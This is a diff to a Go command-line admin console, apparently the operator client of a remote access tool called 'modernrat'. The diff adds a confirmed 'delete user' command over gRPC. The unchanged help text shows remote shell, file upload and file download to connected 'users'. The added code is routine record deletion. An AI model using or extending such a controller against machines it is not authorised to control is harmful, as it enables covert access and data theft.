@@ -7,8 +7,11 @@ import (
 	"io"
 	"path/filepath"
 	"strings"
+	"time"
 
 	pb "modernrat-client/gen"
+
+	"google.golang.org/grpc/metadata"
 )
 
 type adminApp struct {
@@ -219,6 +222,16 @@ func (a *adminApp) executeCommand(cmd string, args []string) error {
 		fmt.Print("\033[H\033[2J")
 		return nil
 
+	case "delete":
+		if len(args) < 1 {
+			return errors.New("delete コマンド: delete <user_id>")
+		}
+		userID := strings.TrimSpace(args[0])
+		if userID == "" {
+			return errors.New("ユーザーIDを指定してください")
+		}
+		return a.deleteUser(userID, true)
+
 	case "quit", "exit", "q":
 		return errCommandExit
 
@@ -283,8 +296,57 @@ func printHelp() {
 	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "shell [user_id]"), "リモートシェルを起動 (:upload/:download 利用可)")
 	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "upload <local> [remote] [--user <id>]"), "ファイルをアップロード")
 	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "download <remote> [local] [--user <id>]"), "ファイルをダウンロード")
+	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "delete <user_id>"), "ユーザーを削除")
 	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "clear"), "画面をクリア")
 	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "exit"), "終了")
+}
+
+func (a *adminApp) deleteUser(userID string, askConfirm bool) error {
+	userID = strings.TrimSpace(userID)
+	if userID == "" {
+		return errors.New("ユーザーIDを指定してください")
+
+	}
+
+	if askConfirm {
+		prompt := fmt.Sprintf("ユーザー %s を削除しますか? [y/N]: ", uiColors.wrap(uiColors.accent, userID))
+		answer, err := readLine(prompt)
+		if err != nil {
+			return err
+		}
+		lower := strings.ToLower(strings.TrimSpace(answer))
+		if lower != "y" && lower != "yes" {
+			fmt.Println(uiColors.wrap(uiColors.warn, "削除をキャンセルしました。"))
+			return nil
+		}
+	}
+
+	ctx, cancel := context.WithTimeout(a.ctx, 10*time.Second)
+	defer cancel()
+
+	md := metadata.New(map[string]string{"authorization": "Bearer " + a.token})
+	ctx = metadata.NewOutgoingContext(ctx, md)
+
+	resp, err := a.adminClient.DeleteUser(ctx, &pb.DeleteUserRequest{UserId: userID})
+	if err != nil {
+		return err
+	}
+	if resp == nil || !resp.GetSuccess() {
+		msg := "ユーザー削除に失敗しました"
+		if resp != nil && strings.TrimSpace(resp.GetMessage()) != "" {
+			msg = resp.GetMessage()
+		}
+		return errors.New(msg)
+	}
+
+	fmt.Printf("%s %s\n", uiColors.wrap(uiColors.success, "ユーザーを削除しました:"), uiColors.wrap(uiColors.accent, userID))
+	if a.attachedUser == userID {
+		a.attachedUser = ""
+	}
+	if a.defaultUser == userID {
+		a.defaultUser = ""
+	}
+	return nil
 }
 
 func shortUserID(userID string) string {
